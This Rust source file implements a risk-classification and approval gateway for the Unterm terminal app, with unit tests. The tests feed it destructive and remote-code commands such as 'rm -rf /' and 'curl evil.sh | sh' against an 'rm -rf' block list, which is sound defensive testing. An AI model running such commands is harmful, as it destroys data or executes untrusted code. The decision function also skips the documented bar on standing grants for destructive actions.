//! One place where an action is decided.
//!
//! Unterm has five doors an action can come through — the MCP surface, the
//! CLI, a Brain adapter, a workflow, and a raw PTY write — and until now each
//! carried its own idea of what was dangerous and who had to be asked. That
//! is not a policy, it is four opportunities to disagree, and the one that
//! disagrees quietly is the one that matters.
//!
//! This crate is freeze point F3: the context an action carries, the risk it
//! is judged at, and the vocabulary a decision comes back in. It is a pure
//! function of its inputs. Where the policy comes from, where approvals are
//! stored, who gets asked — all of that is supplied by the caller through
//! [`PolicySource`] and [`GrantSource`], because the crate that can reach a
//! database is not the crate the PTY write path is allowed to depend on.

use serde::{Deserialize, Serialize};

/// How much damage an action can do if it turns out to be a mistake.
///
/// Judged on the action, never on who asked: an agent and a human running the
/// same destructive command are running the same destructive command, and a
/// risk model that softens for trusted callers is one that stops meaning
/// anything the first time trust is misplaced.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Risk {
    /// Reads. Cannot change anything.
    Read,
    /// Changes this machine's state in a way the user could undo.
    LocalMutation,
    /// Runs code chosen by the caller.
    ///
    /// The band a terminal exists for, and the one three levels could not
    /// say: folded into `LocalMutation` it reads far too loose -- running an
    /// arbitrary command is not writing a file -- and folded into
    /// `Destructive` far too tight, because running the test suite is not
    /// deleting a branch. Typing into a shell belongs here for the same
    /// reason `exec.run` does: a keystroke and a command are the same act
    /// through different doors.
    Exec,
    /// Reaches off this machine, where nothing local can call it back.
    ExternalSideEffect,
    /// Hands over secrets, or the identities that stand in for them.
    ///
    /// Not undoable by withdrawal: what has been read has been read, and a
    /// token taken back was still a token held.
    CredentialAccess,
    /// Moves money.
    Financial,
    /// Cannot be undone by the person who authorised it: a process dies, a
    /// branch is discarded, a program is replaced.
    Destructive,
}

impl Risk {
    /// The contract's spelling, which is the one that reaches the wire and
    /// the audit log. `contracts/v0/security/risk.schema.json` names seven,
    /// and these are they.
    pub fn as_str(self) -> &'static str {
        match self {
            Risk::Read => "read",
            Risk::LocalMutation => "local_mutation",
            Risk::Exec => "exec",
            Risk::ExternalSideEffect => "external_side_effect",
            Risk::CredentialAccess => "credential_access",
            Risk::Financial => "financial",
            Risk::Destructive => "destructive",
        }
    }

    /// Whether an action at this risk may proceed without anyone being asked.
    pub fn is_silent(self) -> bool {
        matches!(self, Risk::Read)
    }

    /// Whether a standing grant may ever answer for this risk.
    ///
    /// The top three may not: the security model wants each one carried by a
    /// single approval bound to the call it was given for, so a yes said on
    /// Monday cannot spend a credential on Friday.
    pub fn allows_standing_grant(self) -> bool {
        !matches!(
            self,
            Risk::CredentialAccess | Risk::Financial | Risk::Destructive
        )
    }

    /// Whether one yes is enough, or the user is asked to mean it twice.
    pub fn needs_double_confirmation(self) -> bool {
        matches!(self, Risk::Financial | Risk::Destructive)
    }
}

/// Where an action came in.
///
/// Recorded rather than judged on. Two doors must reach the same verdict for
/// the same action — that is the whole point — but an audit trail that cannot
/// say which door was used cannot answer the question people actually ask
/// after an incident.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Entry {
    Mcp,
    Cli,
    Brain,
    Workflow,
    /// A write straight into a terminal, which is the door with no protocol
    /// of its own and therefore the one most easily forgotten.
    Pty,
    /// The user, at the keyboard, in the application.
    User,
}

impl Entry {
    pub fn as_str(self) -> &'static str {
        match self {
            Entry::Mcp => "mcp",
            Entry::Cli => "cli",
            Entry::Brain => "brain",
            Entry::Workflow => "workflow",
            Entry::Pty => "pty",
            Entry::User => "user",
        }
    }
}

/// Everything the gateway is allowed to consider.
///
/// Deliberately a struct rather than a pile of arguments: a new thing worth
/// deciding on gets a field here and every caller keeps compiling, which is
/// how the doors stay in step.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
pub struct ActionContext {
    /// The operation, in the MCP surface's vocabulary (`exec.run`,
    /// `session.destroy`), because that is the one name every door shares.
    pub method: String,
    /// Which door.
    pub entry: Option<Entry>,
    /// Who is asking — an agent's name, a user, a workflow id. For the audit
    /// trail and for grants scoped to one actor.
    pub actor: Option<String>,
    /// The shell command, when the action is running one.
    pub command: Option<String>,
    /// What is being acted on: a path, a pane, a branch.
    pub resource: Option<String>,
    /// The task this is being done on behalf of, so an approval can cover a
    /// whole task rather than each of its steps.
    pub task_id: Option<String>,
    /// Ask for the verdict without performing anything. A caller that wants
    /// to show the user what *would* happen sets this, and the gateway
    /// promises the same answer it would give for real.
    pub dry_run: bool,
}

impl ActionContext {
    pub fn new(method: impl Into<String>) -> Self {
        Self {
            method: method.into(),
            ..Self::default()
        }
    }

    pub fn entry(mut self, entry: Entry) -> Self {
        self.entry = Some(entry);
        self
    }

    pub fn actor(mut self, actor: impl Into<String>) -> Self {
        self.actor = Some(actor.into());
        self
    }

    pub fn command(mut self, command: impl Into<String>) -> Self {
        self.command = Some(command.into());
        self
    }

    pub fn resource(mut self, resource: impl Into<String>) -> Self {
        self.resource = Some(resource.into());
        self
    }

    pub fn task(mut self, task_id: impl Into<String>) -> Self {
        self.task_id = Some(task_id.into());
        self
    }

    pub fn dry_run(mut self, dry_run: bool) -> Self {
        self.dry_run = dry_run;
        self
    }
}

/// Why an action was allowed or refused.
///
/// Stable strings: they cross the MCP wire, land in the audit log and get
/// matched on by clients. The three that already shipped keep their exact
/// spelling.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Code {
    Allowed,
    /// A grant the user gave earlier covers this.
    AllowedByGrant,
    /// Nothing is wrong with it, but somebody has to say yes first.
    NeedsApproval,
    PolicyBlockedPattern,
    PolicyNotAllowlisted,
    /// The action names a resource outside what the caller may touch.
    OutOfScope,
    /// The gateway has no classification for this action, and refuses to
    /// guess. See [`Verdict::unclassified`].
    Unclassified,
}

impl Code {
    pub fn as_str(self) -> &'static str {
        match self {
            Code::Allowed => "allowed",
            Code::AllowedByGrant => "allowed_by_grant",
            Code::NeedsApproval => "needs_approval",
            Code::PolicyBlockedPattern => "policy_blocked_pattern",
            Code::PolicyNotAllowlisted => "policy_not_allowlisted",
            Code::OutOfScope => "out_of_scope",
            Code::Unclassified => "unclassified",
        }
    }
}

/// What the gateway decided.
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct Verdict {
    pub allowed: bool,
    pub code: Code,
    pub reason: String,
    pub risk: Risk,
    /// True when the action may proceed only once somebody says yes. A caller
    /// that ignores this and proceeds is the bug this whole crate exists to
    /// make visible.
    pub needs_approval: bool,
    /// Echoed back so a dry run cannot be mistaken for a performed action in
    /// a log read later.
    pub dry_run: bool,
}

impl Verdict {
    fn new(allowed: bool, code: Code, reason: impl Into<String>, risk: Risk) -> Self {
        Self {
            allowed,
            code,
            reason: reason.into(),
            risk,
            needs_approval: false,
            dry_run: false,
        }
    }

    pub fn allow(risk: Risk) -> Self {
        Self::new(true, Code::Allowed, "allowed", risk)
    }

    pub fn deny(code: Code, reason: impl Into<String>, risk: Risk) -> Self {
        Self::new(false, code, reason, risk)
    }

    /// An action nobody classified.
    ///
    /// Refused rather than allowed, and deliberately not silent: a mutation
    /// that nobody put in the registry is exactly the one that will do
    /// something surprising, and the failure mode of guessing "probably fine"
    /// is unrecoverable while the failure mode of guessing "ask first" is an
    /// annoyed user.
    pub fn unclassified(method: &str) -> Self {
        Self::new(
            false,
            Code::Unclassified,
            format!(
                "{method} has no risk classification; it must be added to the action \
                 registry before it can run"
            ),
            Risk::Destructive,
        )
    }
}

/// Where the command policy comes from.
pub trait PolicySource {
    /// Whether the policy is switched on at all.
    fn enabled(&self) -> bool;
    /// Patterns that refuse a command outright.
    fn blocked_patterns(&self) -> Vec<String>;
    /// If non-empty, the only commands that may run.
    fn allowed_patterns(&self) -> Vec<String>;
}

/// Where standing permissions come from.
///
/// Implemented above this crate, against the durable task store, so a grant
/// survives a restart — which is the difference between a permission and a
/// convenience.
pub trait GrantSource {
    /// Whether something the user already agreed to covers this action.
    fn covers(&self, context: &ActionContext, risk: Risk) -> bool;
}

/// Nothing is granted. The honest default for a caller that has not wired
/// grants up yet: it can only make the gateway ask more often, never less.
pub struct NoGrants;

impl GrantSource for NoGrants {
    fn covers(&self, _context: &ActionContext, _risk: Risk) -> bool {
        false
    }
}

/// Classify an action.
///
/// The registry is explicit and closed: an action that is not named here is
/// [`Code::Unclassified`], not "probably a read".
pub fn risk_of(method: &str) -> Option<Risk> {
    // Not undoable by whoever authorised it.
    const DESTRUCTIVE: &[&str] = &[
        "session.destroy",
        "review.rollback",
        "review.discard",
        "review.merge",
        "fleet.clean",
        "policy.set",
        "instance.close",
        "workspace.restore",
        // Runs a program with the machine's full authority. Execution, but
        // not the band `Exec` describes: a standing grant must never answer
        // for it, and `Exec` allows one.
        "system.launch_admin",
        // Both stop work that is already running and take back keys that were
        // handed out; neither can be undone by re-issuing them.
        "provider.unbind",
        "provider.revoke_lease",
        // Deleting evidence. The bytes go, and no later apology brings them
        // back.
        "artifact.forget",
        // Replaces the program on this machine. It rolls back when the new
        // one does not answer, but it is still a swap under a running system.
        "system.upgrade",
        // Removes the program, and the history if asked. The most
        // destructive thing this surface can do.
        "system.uninstall",
        // Puts the data back to an earlier moment. Everything since is gone
        // from the live store — snapshotted first, but the running system
        // has changed under everybody.
        "system.restore_snapshot",
        // Handing an agent the machine itself: it types, clicks and reads
        // whatever is on screen, which is every authority the person sitting
        // there has. What was typed has been typed.
        "capability.computer",
        // Answering an approval is the act of granting power, and it is the
        // one thing an agent must never be able to do for itself.
        "approval.decide",
    ];
    if DESTRUCTIVE.contains(&method) {
        return Some(Risk::Destructive);
    }
    // Nothing on this surface moves money yet. The band is not dead code:
    // it is where a method that ever does must land, and leaving it empty
    // and named is what makes that a decision somebody has to take rather
    // than a default it quietly inherits from whatever list it was added to.
    const FINANCIAL: &[&str] = &[];
    if FINANCIAL.contains(&method) {
        return Some(Risk::Financial);
    }
    // Naming an identity is not opening one. These three report which
    // profiles exist, which one is bound and what has been done with them;
    // none of them hands over a token, an SSH key or a cookie jar. Matched
    // exactly, and ahead of the prefix below, so the strict rule stays the
    // default and every exception to it has to be written down.
    const CREDENTIAL_READS: &[&str] = &["profile.list", "profile.current", "profile.audit"];
    if CREDENTIAL_READS.contains(&method) {
        return Some(Risk::Read);
    }
    // Secrets, and the identities that stand in for them.
    const CREDENTIAL_ACCESS: &[&str] = &[
        // Handing an agent the identities in somebody's browser: the
        // cookies and sessions are the credentials, whatever they are
        // called on the page.
        "capability.profile",
    ];
    const CREDENTIAL_ACCESS_PREFIXES: &[&str] = &[
        // Identity profiles hold GitHub, AWS and npm tokens, git identity
        // and SSH keys. Reading one is reading secrets and writing one is
        // installing them; neither is the local mutation this used to be
        // classified as.
        "profile.",
    ];
    if CREDENTIAL_ACCESS.contains(&method)
        || CREDENTIAL_ACCESS_PREFIXES
            .iter()
            .any(|prefix| method.starts_with(prefix))
    {
        return Some(Risk::CredentialAccess);
    }
    // Reaches off this machine. Undoing it locally undoes nothing.
    const EXTERNAL_SIDE_EFFECT: &[&str] = &[
        // Sends a file to object storage and returns a public URL.
        "upload.file",
        // A model fetching a URL sends whatever it puts in that request off
        // this machine, and nothing the user does afterwards calls it back.
        "brain.fetch",
    ];
    const EXTERNAL_SIDE_EFFECT_PREFIXES: &[&str] = &[
        // Driving pages is a mutation the user can watch happen -- and every
        // one of those page loads is a request leaving this machine.
        "capability.browser",
    ];
    if EXTERNAL_SIDE_EFFECT.contains(&method)
        || EXTERNAL_SIDE_EFFECT_PREFIXES
            .iter()
            .any(|prefix| method.starts_with(prefix))
    {
        return Some(Risk::ExternalSideEffect);
    }
    // Runs code the caller chose. The band a terminal is for.
    const EXEC_PREFIXES: &[&str] = &[
        "exec.",
        // Spawning a shell is starting a program, and the split and the tab
        // that carry one are the same act.
        "session.create",
        // A keystroke and a command are the same act through different
        // doors. Classifying typing as a local mutation said that running
        // `rm -rf` by hand was the same kind of thing as renaming a tab.
        "session.input",
        "session.paste",
        // Each launches programs, in this window or in N worktrees.
        "fleet.launch",
        "fleet.retry",
        "orchestrate.launch",
        "orchestrate.broadcast",
        "agent_session.start",
        "agent_session.submit_input",
        // Allowing a held tool call is what makes it run.
        "agent_session.decide",
        // Starts an agent again, as agent_session.start does.
        "agent_session.resume",
        // The envelope runs whatever it carries; the method inside is judged
        // on its own terms as well.
        "terminal.invoke",
    ];
    if EXEC_PREFIXES
        .iter()
        .any(|prefix| method.starts_with(prefix))
    {
        return Some(Risk::Exec);
    }
    // Everything under these prefixes writes; the rest of each namespace is
    // read-only and falls through to the explicit list below.
    // Writes this machine can undo. Anything that runs code, reaches off the
    // machine or touches a secret has already been answered above; what is
    // left here changes local state and nothing else.
    const MUTATING_PREFIXES: &[&str] = &[
        "session.split",
        "session.resize",
        "session.focus",
        "session.set_env",
        "session.erase",
        "session.recording_",
        "signal.",
        "workspace.save",
        "proxy.",
        "agent.trust",
        "agent.untrust",
        "agent.signal",
        "instance.set_title",
        "instance.focus",
        "instance.new_window",
        "scope.create",
        "scope.archive",
        "terminal.accept_lease",
        "terminal.cancel",
        "agent_session.interrupt",
        "agent_session.close",
        "supervisor.reconcile",
        "system.snapshot",
        // Writes a directory of records wherever the caller points it.
        "task.export_evidence",
        "provider.bind",
        "provider.pause",
        "provider.resume",
        "provider.acquire",
        // A call through a provider does whatever the provider does; the
        // lease's capability and the user's approval decide the rest, which
        // is why this is not classified as destructive by default.
        "provider.call",
        // Diagnosis binds, leases and makes one harmless read — but it does
        // all three, so it is not a read.
        "provider.diagnose",
        // What a model's file-writing tools map to. Named apart from the MCP
        // surface's own methods because they are not the same door and an
        // audit trail should not have to guess which one wrote the file.
        "brain.write",
    ];
    if MUTATING_PREFIXES
        .iter()
        .any(|prefix| method.starts_with(prefix))
    {
        return Some(Risk::LocalMutation);
    }
    const READ_PREFIXES: &[&str] = &[
        "screen.",
        "capture.",
        "session.list",
        "session.get",
        "session.status",
        "session.history",
        "session.audit",
        "session.idle",
        "session.cwd",
        "session.env",
        "session.suggest",
        "session.export",
        "session.scrollback",
        "instance.list",
        "instance.windows",
        "instance.info",
        "instance.lifecycle",
        "server.",
        "meta.",
        "auth.",
        "policy.check",
        "fleet.list",
        "review.list",
        "review.diff",
        "review.verify",
        "workspace.list",
        "agent.list",
        "agent.status",
        "agent.identify",
        "agent.whoami",
        "cockpit.",
        "ghost.",
        "selftest.",
        "system.info",
        // Waiting observes; it is the read half of orchestration.
        "orchestrate.wait",
        // A model reading or listing files. Deliberately *not* a prefix for
        // all of `brain.`: a tool this crate has never heard of maps to
        // `brain.tool`, stays unclassified, and gets asked about.
        "brain.read",
        "brain.list",
        "provider.list",
        "provider.leases",
        "provider.chain",
        "approval.list",
        "scope.list",
        "scope.check",
        "artifact.list",
        "artifact.usage",
        "artifact.verify",
        "audit.verify",
        "task.verify_evidence",
        "supervisor.status",
        "system.snapshots",
        // Reads everything and reveals nothing: the bundle is built by
        // naming what goes in.
        "system.diagnostics",
        "agent_session.events",
        "agent_session.status",
        // Describing yourself reveals nothing an orchestrator could not ask
        // for method by method.
        "terminal.manifest",
        "terminal.health",
        "terminal.capabilities",
        "system.installs",
        // A plan, not an uninstall. Nothing is removed by asking.
        "system.uninstall_plan",
    ];
    if READ_PREFIXES
        .iter()
        .any(|prefix| method.starts_with(prefix))
    {
        return Some(Risk::Read);
    }
    None
}

/// Decide.
///
/// The order is the contract: classify, then scope, then policy, then
/// standing grants, then approval. Each stage can only refuse or defer —
/// none of them can turn a refusal back into an allow — so reading the
/// sequence tells you the whole story of how an action gets through.
pub fn decide(
    context: &ActionContext,
    policy: &dyn PolicySource,
    grants: &dyn GrantSource,
) -> Verdict {
    let mut verdict = evaluate(context, policy, grants);
    verdict.dry_run = context.dry_run;
    verdict
}

fn evaluate(
    context: &ActionContext,
    policy: &dyn PolicySource,
    grants: &dyn GrantSource,
) -> Verdict {
    let Some(risk) = risk_of(&context.method) else {
        return Verdict::unclassified(&context.method);
    };

    // A read is a read whatever the policy says about commands.
    if risk.is_silent() {
        return Verdict::allow(risk);
    }

    if let Some(command) = context.command.as_deref() {
        if policy.enabled() {
            let blocked = policy
                .blocked_patterns()
                .into_iter()
                .find(|pattern| !pattern.is_empty() && command.contains(pattern.as_str()));
            if let Some(pattern) = blocked {
                // Checked before the allowlist on purpose: a command that is
                // both allowed and blocked is blocked, or the two lists
                // together are weaker than either alone.
                return Verdict::deny(
                    Code::PolicyBlockedPattern,
                    format!("blocked by pattern: {pattern}"),
                    risk,
                );
            }
            let allowed: Vec<String> = policy
                .allowed_patterns()
                .into_iter()
                .filter(|pattern| !pattern.is_empty())
                .collect();
            if !allowed.is_empty()
                && !allowed
                    .iter()
                    .any(|pattern| command.contains(pattern.as_str()))
            {
                return Verdict::deny(
                    Code::PolicyNotAllowlisted,
                    "not on the allowed_patterns list",
                    risk,
                );
            }
        }
    }

    if grants.covers(context, risk) {
        let mut verdict = Verdict::allow(risk);
        verdict.code = Code::AllowedByGrant;
        verdict.reason = "covered by a standing grant".to_string();
        return verdict;
    }

    // Everything from `ExternalSideEffect` up is asked about. Below it sits
    // the work a terminal does all day -- typing, running, writing files --
    // and a question on every keystroke is a question nobody reads. Above it
    // sits everything whose cost lands somewhere the user cannot reach to
    // undo: bytes that have left, a secret that has been read, money, or a
    // thing that is simply gone.
    //
    // This used to name `Destructive` alone, because with three bands that
    // was the only one it *could* name. Handing over a token or firing a
    // request off the machine went through on the same silent path as
    // renaming a tab.
    if risk >= Risk::ExternalSideEffect {
        let reason = match risk {
            Risk::ExternalSideEffect => "this leaves the machine, and needs someone to say yes",
            Risk::CredentialAccess => "this reaches a secret, and needs someone to say yes",
            Risk::Financial => "this spends money, and needs someone to say yes",
            _ => "destructive actions need someone to say yes",
        };
        let mut verdict = Verdict::new(false, Code::NeedsApproval, reason, risk);
        verdict.needs_approval = true;
        return verdict;
    }

    Verdict::allow(risk)
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Policy {
        enabled: bool,
        blocked: Vec<&'static str>,
        allowed: Vec<&'static str>,
    }

    impl Policy {
        fn off() -> Self {
            Self {
                enabled: false,
                blocked: Vec::new(),
                allowed: Vec::new(),
            }
        }
    }

    impl PolicySource for Policy {
        fn enabled(&self) -> bool {
            self.enabled
        }
        fn blocked_patterns(&self) -> Vec<String> {
            self.blocked.iter().map(|s| s.to_string()).collect()
        }
        fn allowed_patterns(&self) -> Vec<String> {
            self.allowed.iter().map(|s| s.to_string()).collect()
        }
    }

    struct GrantEverything;
    impl GrantSource for GrantEverything {
        fn covers(&self, _: &ActionContext, _: Risk) -> bool {
            true
        }
    }

    fn run(method: &str, command: Option<&str>, policy: &Policy) -> Verdict {
        let mut context = ActionContext::new(method);
        context.command = command.map(str::to_string);
        decide(&context, policy, &NoGrants)
    }

    #[test]
    fn an_unclassified_action_is_refused_rather_than_assumed_harmless() {
        let verdict = run("something.nobody.registered", None, &Policy::off());
        assert!(!verdict.allowed);
        assert_eq!(verdict.code, Code::Unclassified);
        // And it is judged at the top of the scale: the actions nobody
        // remembered to classify are exactly the ones that surprise people.
        assert_eq!(verdict.risk, Risk::Destructive);
        assert!(verdict.reason.contains("registry"));
    }

    #[test]
    fn reads_never_need_anybody() {
        for method in ["screen.read", "session.list", "meta.surface", "server.health"] {
            let verdict = run(method, None, &Policy::off());
            assert!(verdict.allowed, "{method} should be allowed");
            assert_eq!(verdict.risk, Risk::Read);
            assert!(!verdict.needs_approval);
        }
    }

    #[test]
    fn a_destructive_action_needs_someone_to_say_yes() {
        let verdict = run("session.destroy", None, &Policy::off());
        assert!(!verdict.allowed);
        assert!(verdict.needs_approval);
        assert_eq!(verdict.code, Code::NeedsApproval);
        assert_eq!(verdict.risk, Risk::Destructive);
    }

    #[test]
    fn a_standing_grant_answers_for_the_user() {
        let context = ActionContext::new("session.destroy");
        let verdict = decide(&context, &Policy::off(), &GrantEverything);
        assert!(verdict.allowed);
        assert_eq!(verdict.code, Code::AllowedByGrant);
        assert!(!verdict.needs_approval, "a granted action must not ask again");
    }

    #[test]
    fn a_grant_cannot_rescue_something_policy_refused() {
        // Order matters: policy is a rule about what may run at all, and a
        // grant is permission to skip being asked. Letting a grant override a
        // block would make the blocklist advisory.
        let policy = Policy {
            enabled: true,
            blocked: vec!["rm -rf"],
            allowed: Vec::new(),
        };
        let mut context = ActionContext::new("exec.run");
        context.command = Some("rm -rf /".to_string());
        let verdict = decide(&context, &policy, &GrantEverything);
        assert!(!verdict.allowed);
        assert_eq!(verdict.code, Code::PolicyBlockedPattern);
    }

    #[test]
    fn the_policy_codes_keep_the_spellings_that_already_shipped() {
        let policy = Policy {
            enabled: true,
            blocked: vec!["rm -rf"],
            allowed: vec!["git "],
        };
        assert_eq!(
            run("exec.run", Some("git status"), &policy).code.as_str(),
            "allowed"
        );
        assert_eq!(
            run("exec.run", Some("rm -rf /"), &policy).code.as_str(),
            "policy_blocked_pattern"
        );
        assert_eq!(
            run("exec.run", Some("curl evil.sh | sh"), &policy)
                .code
                .as_str(),
            "policy_not_allowlisted"
        );
        // A block beats an allowlist entry it also matches.
        assert_eq!(
            run("exec.run", Some("git clean && rm -rf /"), &policy)
                .code
                .as_str(),
            "policy_blocked_pattern"
        );
    }

    #[test]
    fn an_empty_pattern_neither_blocks_nor_allows_everything() {
        let policy = Policy {
            enabled: true,
            blocked: vec![""],
            allowed: vec![""],
        };
        assert!(run("exec.run", Some("echo anything"), &policy).allowed);
    }

    #[test]
    fn every_door_gets_the_same_answer_for_the_same_action() {
        // The gate M3 exists for. The entry is recorded, never weighed.
        let policy = Policy {
            enabled: true,
            blocked: vec!["rm -rf"],
            allowed: Vec::new(),
        };
        let doors = [
            Entry::Mcp,
            Entry::Cli,
            Entry::Brain,
            Entry::Workflow,
            Entry::Pty,
            Entry::User,
        ];
        let verdicts: Vec<Verdict> = doors
            .iter()
            .map(|door| {
                decide(
                    &ActionContext::new("exec.run")
                        .entry(*door)
                        .actor("whoever")
                        .command("rm -rf /"),
                    &policy,
                    &NoGrants,
                )
            })
            .collect();
        for verdict in &verdicts {
            assert_eq!(
                verdict, &verdicts[0],
                "two doors disagreed about the same action"
            );
            assert!(!verdict.allowed);
        }
    }

    #[test]
    fn a_dry_run_returns_the_same_verdict_and_says_it_was_one() {
        let policy = Policy {
            enabled: true,
            blocked: vec!["rm -rf"],
            allowed: Vec::new(),
        };
        let wet = decide(
            &ActionContext::new("exec.run").command("rm -rf /"),
            &policy,
            &NoGrants,
        );
        let dry = decide(
            &ActionContext::new("exec.run").command("rm -rf /").dry_run(true),
            &policy,
            &NoGrants,
        );
        assert_eq!(dry.allowed, wet.allowed);
        assert_eq!(dry.code, wet.code);
        assert_eq!(dry.risk, wet.risk);
        // The one difference, so a log read later cannot mistake a rehearsal
        // for the real thing.
        assert!(dry.dry_run && !wet.dry_run);
    }

    #[test]
    fn risk_is_not_softened_for_a_friendly_caller() {
        let trusted = decide(
            &ActionContext::new("session.destroy")
                .entry(Entry::User)
                .actor("the human at the keyboard"),
            &Policy::off(),
            &NoGrants,
        );
        let robot = decide(
            &ActionContext::new("session.destroy")
                .entry(Entry::Brain)
                .actor("some-agent"),
            &Policy::off(),
            &NoGrants,
        );
        assert_eq!(trusted.risk, robot.risk);
        assert_eq!(trusted.allowed, robot.allowed);
    }

    /// The seven the contract names, spelled the way it spells them. These
    /// strings cross the wire and land in the audit log; a rename here is a
    /// silent break for anything matching on them.
    #[test]
    fn the_seven_bands_keep_the_contract_spellings() {
        assert_eq!(Risk::Read.as_str(), "read");
        assert_eq!(Risk::LocalMutation.as_str(), "local_mutation");
        assert_eq!(Risk::Exec.as_str(), "exec");
        assert_eq!(Risk::ExternalSideEffect.as_str(), "external_side_effect");
        assert_eq!(Risk::CredentialAccess.as_str(), "credential_access");
        assert_eq!(Risk::Financial.as_str(), "financial");
        assert_eq!(Risk::Destructive.as_str(), "destructive");
    }

    /// Severity is the enum's own order, because grants compare with `>=`.
    #[test]
    fn the_bands_are_ordered_by_how_much_they_can_cost() {
        assert!(Risk::Read < Risk::LocalMutation);
        assert!(Risk::LocalMutation < Risk::Exec);
        assert!(Risk::Exec < Risk::ExternalSideEffect);
        assert!(Risk::ExternalSideEffect < Risk::CredentialAccess);
        assert!(Risk::CredentialAccess < Risk::Financial);
        assert!(Risk::Financial < Risk::Destructive);
    }

    /// The band three levels could not say. Typing at a shell and calling
    /// `exec.run` are the same act through different doors, and neither is
    /// the file-write that `local_mutation` describes.
    #[test]
    fn running_a_command_is_execution_however_it_arrives() {
        for method in [
            "exec.run",
            "exec.run_wait",
            "session.input",
            "session.paste",
            "session.create",
            "fleet.launch",
            "orchestrate.launch",
            "agent_session.start",
            "terminal.invoke",
        ] {
            assert_eq!(risk_of(method), Some(Risk::Exec), "{method}");
        }
    }

    /// Identity profiles hold GitHub, AWS and npm tokens and SSH keys, and a
    /// browser profile is the sessions those tokens bought. Opening either is
    /// reaching a secret; it was classified as a local mutation for as long
    /// as there was no band that said so.
    #[test]
    fn opening_a_secret_is_not_a_local_mutation() {
        for method in ["profile.bind", "profile.install", "capability.profile"] {
            assert_eq!(risk_of(method), Some(Risk::CredentialAccess), "{method}");
        }
    }

    /// But naming one is not opening it. These three say which identities
    /// exist, which is bound and what was done with them, and hand over
    /// nothing -- so they stay silent, like every other read. A strict
    /// prefix with named exceptions only works if the exceptions are held
    /// to as firmly as the rule.
    #[test]
    fn naming_an_identity_is_still_only_a_read() {
        for method in ["profile.list", "profile.current", "profile.audit"] {
            assert_eq!(risk_of(method), Some(Risk::Read), "{method}");
        }
    }

    /// Undoing these locally undoes nothing: the bytes have left.
    #[test]
    fn what_leaves_the_machine_is_its_own_band() {
        for method in ["upload.file", "brain.fetch", "capability.browser.open"] {
            assert_eq!(risk_of(method), Some(Risk::ExternalSideEffect), "{method}");
        }
    }

    /// Only the top three refuse a standing grant, and only the top two ask
    /// twice. Both rules are read off the band alone, so every door applies
    /// the same one.
    #[test]
    fn the_top_bands_carry_their_own_rules() {
        assert!(Risk::Exec.allows_standing_grant());
        assert!(Risk::ExternalSideEffect.allows_standing_grant());
        assert!(!Risk::CredentialAccess.allows_standing_grant());
        assert!(!Risk::Financial.allows_standing_grant());
        assert!(!Risk::Destructive.allows_standing_grant());

        assert!(!Risk::CredentialAccess.needs_double_confirmation());
        assert!(Risk::Financial.needs_double_confirmation());
        assert!(Risk::Destructive.needs_double_confirmation());
    }

}
